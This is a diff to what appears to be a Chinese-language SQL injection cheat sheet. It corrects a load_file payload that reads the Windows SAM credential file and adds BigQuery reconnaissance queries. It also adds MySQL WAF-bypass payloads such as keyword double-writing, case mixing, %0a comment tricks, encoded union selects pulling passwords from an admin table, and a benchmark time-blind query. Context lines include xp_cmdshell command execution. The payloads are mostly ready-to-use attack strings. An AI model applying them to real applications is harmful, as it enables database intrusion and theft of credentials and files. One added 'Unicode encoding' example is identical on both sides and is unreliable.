@@ -492,7 +492,7 @@ UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE('MSG',
 如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限，在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只有 administrators 才能访问的文件，users 就别想 load_file 出来。
 
 ```sql
-Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))
+Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))
 
 -1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))
 -- Explain："char(99,58,47,98,111,111,116,46,105,110,105)"就是"c:/boot.ini"的ASCII代码
@@ -665,7 +665,7 @@ exec master..xp_cmdshell 'cmd /c whoami'
 
 ### Oracle
 
-> JSP应用程序通常具有Oracle数据库。
+> JSP 应用程序通常具有 Oracle 数据库。
 
 ---
 
@@ -676,33 +676,71 @@ exec master..xp_cmdshell 'cmd /c whoami'
 
 ---
 
+### BigQuery
+
+**相关文章**
+- [BigQuery SQL Injection Cheat Sheet](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)
+
+**Playground**
+- https://console.cloud.google.com/bigquery
+
+**信息收集**
+```
+SELECT * FROM INFORMATION_SCHEMA.SCHEMATA
+select @@project_id
+select session_user()
+```
+
+---
+
 ## 绕过技巧
 
 ### MYSQL
+
+**相关文章**
+- [一次简单的waf绕过](https://mp.weixin.qq.com/s/YUhUMyEsP9rvezHmXEaR2g)
 
 **常见的绕过技巧**
 
 ```bash
 # 双写
-seselectlect
+❌ select
+✔ seselectlect
 
 # 大小写
-SElect
+❌ select
+✔ SElect
 
 # 负数
-?id=1 ANd -1=-1
+❌ ?id=1 ANd 1=1
+✔ ?id=1 ANd -1=-1
 
 # +号连接绕过
-?id=1+and+1=1
-?id=1+union+select+1+2
+❌ ?id=1 ANd 1=1
+✔ ?id=1+and+1=1
+✔ ?id=1+union+select+1+2
 
 # 无闭合
-?id=1 --+/*%0aand 1=1 --+*/
+❌ ?id=1 and 1=1
+✔ ?id=1 --+/*%0aand 1=1 --+*/
 
 # 有闭合
-?id=1 --+/*%0a'and 1=1 --+ --+*/
-?id=1 --+/*%0aand 1=1 --+*/
-?id=1 --+/*%0a'and 1=1 --+ --+*
+❌ ?id=1 and 1=1
+✔ ?id=1 --+/*%0a'and 1=1 --+ --+*/
+✔ ?id=1 --+/*%0aand 1=1 --+*/
+✔ ?id=1 --+/*%0a'and 1=1 --+ --+*
+
+# %09、%0a、%0b、%0c、%0d、%a0 替换 %20
+❌ and false union select 1,2,......,31--
+✔ and%0afalse%0aunion%0aselect%0a1,2,......,31--+
+
+# URL 编码
+❌ ?id=1 union select pass from admin limit 1
+✔ 1%20union%20select%20pass%20from%20admin%20limit%201
+
+# Unicode 编码
+❌ ?id=1 union select pass from admin limit 1
+✔ ?id=1 union select pass from admin limit 1
 ```
 
 **过滤函数**
@@ -710,6 +748,11 @@ SElect
     ```sql
     and length(database())=7
     HAVING length(database())=7
+    ```
+
+- benchmark 代替 sleep
+    ```sql
+    id=1 and if(ascii(substring((database()),1,1))=115,(select benchmark(1000000,md5(0x41))),1) --+
     ```
 
 - 字符串截取函数
